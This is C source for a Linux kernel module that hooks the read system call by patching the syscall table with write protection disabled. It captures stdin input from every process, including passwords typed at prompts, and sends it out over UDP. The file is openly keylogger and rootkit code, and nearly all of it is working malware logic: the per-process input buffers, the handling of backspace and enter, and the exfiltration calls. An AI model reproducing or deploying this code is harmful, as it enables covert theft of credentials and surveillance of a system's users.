#include<linux/kernel.h>
#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/types.h>
#include<linux/slab.h>
#include<linux/string.h>
#include<linux/list.h>
#include<linux/sched.h>
#include<linux/fs.h>
#include<linux/fdtable.h>
#include<linux/dcache.h>
#include<linux/hash.h>
#include<linux/delay.h>
#include<linux/spinlock_types.h>

#include "read_hooking.h"
#include "hooking.h"
#include "keylogging_udp.h"

#define INPUTBUFLEN 1024  //This was arbitrarily chosen to be huge
#define MAX_PIDC 255

/* This struct contains a buffer for a task that we read from via stdin
 *  Every task is identified by pid.
 *  These structs are often referred to as 'input buffer' or 'tinbuf'
 */
struct taskinput_buffer{
  pid_t pid;
  char buf[INPUTBUFLEN];
  unsigned short bufpos;
  struct list_head list;
};

char buffer[INPUTBUFLEN];

ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
int r_count=0;

struct taskinput_buffer inbuf_head;
spinlock_t tinbuf_lock;

/* Create a new input buffer for a task of a given pid */
struct taskinput_buffer * add_input_buffer(pid_t pid){
  struct taskinput_buffer * new_tib;
  printk(KERN_INFO "new Task %d\n", current->pid);

  new_tib = (struct taskinput_buffer *) kmalloc(sizeof(struct taskinput_buffer), GFP_KERNEL);	
  new_tib->pid = pid;
  new_tib->bufpos = 0;	

  list_add(&(new_tib->list), &(inbuf_head.list));

  return new_tib;
}

/* Traverse the list of input buffers and return the corresponding tinbuf
 *  If none was found, a new struct is created, added to the list and returned
 */
struct taskinput_buffer * find_tinbuf(pid_t pid){
  struct taskinput_buffer * it;
  if(pid<0) return NULL;

  spin_lock(&tinbuf_lock);
  list_for_each_entry(it, &inbuf_head.list, list){
    if(it->pid < 0) continue;
    if(it->pid == pid){
      spin_unlock(&tinbuf_lock);
      return it;
    }
  }
  it = add_input_buffer(pid);
  spin_unlock(&tinbuf_lock);
  return it;
}

static ssize_t my_read(int fd, void *buf, size_t count){
  ssize_t retVal;
  struct taskinput_buffer * cur_tinb = NULL;
  int i;
  char c;
  r_count++;
  retVal = orig_sys_read(fd, buf, count);
  if(retVal <= 0){
    r_count --;
    return retVal;
  }

  if(fd == 0){	//case file is stdin
    printk(KERN_INFO "pid %d\n", current->pid);

    cur_tinb = find_tinbuf(current->pid);

    for(i = 0; i < retVal; i++){
      if(cur_tinb->bufpos >= INPUTBUFLEN-1){
        send_udp(cur_tinb->pid ,cur_tinb->buf);
        cur_tinb->bufpos = 0;
      }
      c =  *((char*)buf+i);
      if(c == 0x7f){ //handle backspace
        if(cur_tinb->bufpos > 0){ //prevent going further than 0
          cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
          cur_tinb->buf[cur_tinb->bufpos] = '\0';
        }
        continue;
      }
      if(c == 0x0d){ //handle enter press
        cur_tinb->buf[cur_tinb->bufpos] = '\0';
        cur_tinb->bufpos = 0;

        send_udp(cur_tinb->pid ,cur_tinb->buf);

        *cur_tinb->buf = '\0';
        continue;
      }
      cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
      cur_tinb->bufpos++;
      cur_tinb->buf[cur_tinb->bufpos] = '\0';
    }
  }
  r_count--;
  return retVal;
}

static ssize_t my_read_simple(int fd, void *buf, size_t count){
	static int buf_size = 0;
	ssize_t retVal;
	r_count++;
	retVal = orig_sys_read(fd, buf, count);
  if(retVal <= 0 || count <= 0){
    r_count --;
    return retVal;
  }
	if(fd == 0){ //stdin
		while(count >= INPUTBUFLEN){
			strncpy(buffer, (char*)buf, INPUTBUFLEN-1);
			buffer[INPUTBUFLEN-1] = '\0';
      send_udp(current->pid, buffer);
      count-= (INPUTBUFLEN -1);
		}
		strncpy(buffer, (char*)buf, count);
		buffer[count] = '\0';
    send_udp(current->pid, buffer);
	}
	r_count--;
	return retVal;
}

void hook_read(void ** syscall_table){
  tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
  INIT_LIST_HEAD(&inbuf_head.list);

  disable_wp();
  orig_sys_read = syscall_table[__NR_read];
  syscall_table[__NR_read] = my_read_simple;
  enable_wp();
}

void unhook_read(void ** syscall_table){
  struct taskinput_buffer * it;

  disable_wp();
  syscall_table[__NR_read] = orig_sys_read;
  enable_wp();
  
  spin_lock(&tinbuf_lock);
  list_for_each_entry(it, &inbuf_head.list, list){
    if(it->bufpos > 0){
        send_udp(it->pid, it->buf);
    }
  }
  spin_unlock(&tinbuf_lock);
  send_udp(current->pid, "Unhook read!");
  while(r_count>0){// hack to unblock read
    printk(KERN_INFO "\n");
    msleep_interruptible(100);
  }
}

